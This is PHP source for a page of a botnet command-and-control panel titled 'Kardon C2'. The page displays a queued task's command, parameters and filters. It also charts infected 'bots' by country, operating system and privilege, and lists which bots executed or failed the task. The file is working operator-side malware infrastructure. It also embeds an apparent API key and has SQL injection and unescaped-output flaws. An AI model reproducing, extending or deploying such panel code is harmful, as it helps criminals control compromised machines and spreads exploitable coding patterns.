<?php
    include '../inc/session.php';
    include '../inc/stats.php';
    include '../inc/geo.php';
    $userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);  
?>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Kardon C2</title>
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="../img/android-desktop.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="../img/ios-desktop.png">
    <meta name="msapplication-TileImage" content="../img/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">
    <link rel="shortcut icon" href="../img/favicon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.cyan-light_blue.min.css">
    <link rel="stylesheet" href="../css/styles.css">
    <style>
    #view-source {
      position: fixed;
      display: block;
      right: 0;
      bottom: 0;
      margin-right: 40px;
      margin-bottom: 40px;
      z-index: 900;
    }
    </style>
    <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
        <script type="text/javascript">
        google.charts.load('current', {
        'packages':['geochart', 'corechart'],
        'mapsApiKey': 'AIzaSyAmjTDuWiy-V8RbMbtk1j6SbBm_hoNftBo'
        });
        google.charts.setOnLoadCallback(drawRegionsMap);
        google.charts.setOnLoadCallback(drawTopCountries);
        google.charts.setOnLoadCallback(drawTopOs);
        google.charts.setOnLoadCallback(drawTopPriv);
        function drawTopPriv()
        {
            var data = google.visualization.arrayToDataTable([
                ['privilege', 'Bots'],
                <?php
                $csel = $odb->query("SELECT privileges, COUNT(*) AS cnt FROM bots GROUP BY privileges ORDER BY cnt DESC");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart3'));
              chart.draw(data, options);
        }
        function drawTopOs()
        {
            var data = google.visualization.arrayToDataTable([
                ['Operating Sys', 'Bots'],
                <?php
                $csel = $odb->query("SELECT osversion, COUNT(*) AS cnt FROM bots GROUP BY osversion ORDER BY cnt DESC LIMIT 3");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart2'));
              chart.draw(data, options);
        }
        function drawTopCountries()
        {
            var data = google.visualization.arrayToDataTable([
                ['Country', 'Bots'],
                <?php
                $csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt DESC LIMIT 3");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart1'));
              chart.draw(data, options);
        }
        function drawRegionsMap() {
            var data = google.visualization.arrayToDataTable([
                ['Country', 'Bots'],
                <?php
                $csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
            ]);
            var options = {};
            var chart = new google.visualization.GeoChart(document.getElementById('regions_div'));
            chart.draw(data, options);
      }
    </script>
  </head>
  <body>
    <div class="demo-layout mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header">
      <header class="demo-header mdl-layout__header mdl-color--<?php echo $c_header; ?> mdl-color-text--grey-400">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">
          <?php
                $details = $odb->prepare("SELECT * FROM tasks WHERE id = :id");
                $details->execute(array(":id" => $_GET['id']));
                $d = $details->fetch(PDO::FETCH_ASSOC);
                echo "Task: ".$d['id'];
          ?>
          </span>
          <div class="mdl-layout-spacer"></div>
          <?php echo $header;?>
          <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" id="hdrbtn">
            <i class="material-icons">more_vert</i>
          </button>
          <ul class="mdl-menu mdl-js-menu mdl-js-ripple-effect mdl-menu--bottom-right" for="hdrbtn">
            <li onclick="location.href = 'account.php';" class="mdl-menu__item">Account</li>
            <li onclick="location.href = 'settings.php';"class="mdl-menu__item">Settings</li>
            <li onclick="location.href = '../inc/logout.php?logout';"class="mdl-menu__item">Logout</li>
          </ul>
        </div>
      </header>
      <div class="demo-drawer mdl-layout__drawer mdl-color--<?php echo $c_sideBarTop; ?> mdl-color-text--blue-grey-50">
      <header class="demo-drawer-header">
          <img src="../img/user.jpg" class="demo-avatar">
          <div class="demo-avatar-dropdown">
            <span><br /><?php echo $username; ?></span>
            <div class="mdl-layout-spacer"></div>
            <button id="accbtn" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
              <i class="material-icons" role="presentation">arrow_drop_down</i>
              <span class="visuallyhidden">Manage Users</span>
            </button>
            <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="accbtn">
              <li onclick="location.href = 'users.php';" class="mdl-menu__item">Manage Users</li>
            </ul>
          </div>
        </header>
        <nav class="demo-navigation mdl-navigation mdl-color--<?php echo $c_sideBarMain; ?>">
        <a class="mdl-navigation__link" href="index.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">dashboard</i>Dashboard</a>
        <a class="mdl-navigation__link" href="clients.php"> <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">computer</i>Clients</a>
          <a class="mdl-navigation__link" href="tasks.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">schedule</i>Tasks</a>
          <?php
          $plugins = array_slice(scandir("./plugin/"), 2);
          foreach ($plugins as &$plugin)
          {
            if(pathinfo($plugin, PATHINFO_EXTENSION) == "php")
            {
              echo '<a class="mdl-navigation__link" href="./plugin/'.$plugin.'">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">note</i>'.ucfirst(basename($plugin, ".php")) .'</a>';
            }
          }
          ?>
          <a class="mdl-navigation__link" href="logs.php">    <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">list</i>Logs</a>
        </nav>
      </div>
      <main class="mdl-layout__content mdl-color--<?php echo $c_main; ?>">
        <div class="mdl-grid demo-content">
          <?php
            if (isset($_GET['id']))
            {
              if (!ctype_digit($_GET['id']))
              {
                echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><font style="color: #F44336;">Specified ID is not valid. Redirecting...</font></div><meta http-equiv="refresh" content="2;url=clients.php">';
                die();
              }else{
                $cnt = $odb->prepare("SELECT COUNT(*) FROM tasks WHERE id = :id");
                $cnt->execute(array(":id" => $_GET['id']));
                if (!($cnt->fetchColumn(0) > 0))
                {
                  echo '<div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col"><font style="color: #F44336;">Specified ID was not found in database. Redirecting...</font></div><meta http-equiv="refresh" content="2;url=clients.php">';
                  die();
                }
              }
            }
          ?>
          <div class="mdl-shadow--2dp mdl-color--<?php echo $c_mainAlt; ?> mdl-cell mdl-cell--12-col">
            <center>
              <br>
              <?php
              $execs = $odb->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i");
              $execs->execute(array(":i" => $d['id']));
              $ex = $execs->fetchColumn(0);

              $st = "";
              if ($d['status'] == "1")
              {
                  if ($ex == $d['executions'])
                  {
                      $st = '<font style="color: #4CAF50;">Completed</font>';
                  }else{
                      $st = '<font style="color: #F9A825;">Running</font>';
                  }
              }else{
                  $st = '<font style="color: #F44336;">Paused</font>';
}
              ?>
              <h6><?php echo $st; ?></h6>
              <br><br>
              <table class="mdl-data-table mdl-js-data-table mdl-data-table mdl-shadow--2dp">
                <thead>
                  <tr>
                    <th class="mdl-data-table__cell--non-numeric">Key</th>
                    <th width="50%">Value</th>
                  </tr>
                </thead>
                <tbody>
                  <tr><td class="mdl-data-table__cell--non-numeric">ID</td><td><?php echo $d['id']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">task</td><td><?php echo $d['task']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">params</td><td><?php echo $d['params']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">filers</td><td><?php echo $d['filters']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">executions</td><td><?php echo $d['executions']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">username</td><td><?php echo $d['username']; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">status</td><td><?php echo $st; ?></td></tr>
                  <tr><td class="mdl-data-table__cell--non-numeric">date</td><?php echo '<td data-order="'.$d['date'].'">'.date("m-d-Y, h:i A", $d['date']).'</td>'; ?></tr>
                  
                </tbody>
              </table>
              <?php
                $comp = $odb->prepare("SELECT * FROM tasks_completed WHERE taskid = :id");
                $comp->execute(array(":id" => $_GET['id']));

                $fail = $odb->prepare("SELECT * FROM tasks_failed WHERE taskid = :id");
                $fail->execute(array(":id" => $_GET['id']));
              ?>
              <br><br>
              <h6>Execution Status</h6>
              <table class="mdl-data-table mdl-js-data-table mdl-data-table mdl-shadow--2dp">
                <thead>
                  <tr>
                    <th class="mdl-data-table__cell--non-numeric">Bot</th>
                    <th width="50%">Status</th>
                    <th class="mdl-data-table__cell--non-numeric">Error Code</th>
                  </tr>
                </thead>
                <tbody>
                <?php
                while ( $f = $comp->fetch(PDO::FETCH_ASSOC))
                {
                    echo '
                    <tr><td class="mdl-data-table__cell--non-numeric">'.$f['bothwid'].'</td><td><font style="color: #4CAF50;">Executed</font></td><td><font style="color: #4CAF50;">0</font></td></tr>
                    ';
                }
                while ( $g = $fail->fetch(PDO::FETCH_ASSOC))
                {
                    echo '
                    <tr><td class="mdl-data-table__cell--non-numeric">'.$g['bothwid'].'</td><td><font style="color: #F44336;">Failed</font></td><td><font style="color: #F44336;">'.$g['error'].'</font></td></tr>
                    ';
                }
                ?>
                </tbody>
              </table>
              <br>
            </center>
          </div>
        </div>
      </main>
    </div>
    <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
  </body>
</html>
